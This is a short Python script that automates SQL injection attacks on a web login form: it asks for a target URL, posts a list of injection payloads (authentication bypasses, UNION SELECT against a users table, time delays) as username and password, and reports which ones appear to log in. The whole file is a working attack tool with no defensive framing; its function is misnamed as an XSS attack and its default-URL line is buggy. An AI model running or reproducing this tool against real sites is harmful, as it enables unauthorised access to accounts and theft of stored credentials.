import requests
from abu_color import AbuAll
pay = [
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR 1=1 #",
    "' OR SLEEP(3) --",
    "' UNION SELECT id, username, password FROM users --",
    "'' UNION SELECT NULL --",
    "' ORDER BY 3 --",
    "' ORDER BY 1 --",
    "' OR (SELECT COUNT(*) FROM users) > 0 --",
    "' OR 0x31=0x31 --",
    "' UNION SELECT 1, 'hacker', 'pass' --",
    "' OR name IN ('admin','root') --",
    "' OR name LIKE '%admin%' --",
    "admin' --",
    "' OR EXISTS(SELECT * FROM users) --",
    "' AND 1=2 --",
    "' AND 1=1 --"
]

def XssAttack():
    while True:
         error=0
         target = input(AbuAll("Enter target url: ",bg="blue"))
         if target == "": target=="https://example.com"
         con =["https","http"]
         for check in con:
             if not target.startswith(check):
                 error+=1
         if error in [0,1]:
            break
         if error > 1:
             print("Please enter correct url, Try again")
    for payload in pay:
        config = {
            "username": payload,
            "password": payload
        }
        try:
            r = requests.post(target, data=config)
        except Exception as e:
            print(AbuAll(f"Request failed for payload: {payload}\nError: {e}",bg="dim"))
            continue
        print(f"Payload: {payload}")
        print(f"Status: {r.status_code}")
        x=r.text[:200]
        with open("injected.html","w") as f:
            f.write(x)
        if "Welcome" in r.text or "/logout" in r.text:
            print(AbuAll(f"[+] Injection successful with: {payload}",bg="yellow",sty="b"))
        else:
            print(AbuAll(f"[-] Not working: {payload}",bg="red"))

